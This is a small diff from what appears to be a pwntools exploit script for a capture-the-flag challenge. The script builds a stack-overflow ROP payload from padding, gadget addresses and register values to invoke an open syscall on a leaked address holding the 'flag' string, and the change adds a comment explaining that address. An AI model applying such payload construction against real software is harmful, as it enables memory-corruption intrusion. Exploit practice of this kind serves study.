@@ -27,7 +27,7 @@ pad = b'A' * cyclic_find("maaaaaaa", n=8)
 
 
 rax = 0x02 # open sys_call
-rdi = int(leaks[0], 16)
+rdi = int(leaks[0], 16) # address where 'flag' keyword get stored
 rsi = 0x00
 rdx = 0x00
 payload = flag_path + pad + p64(target_address_1) + p64(rax) + p64(target_address_2) + p64(rdi) + p64(target_address_3) + p64(rsi) + p64(target_address_4) + p64(rdx) + p64(target_address_5) # open syscall
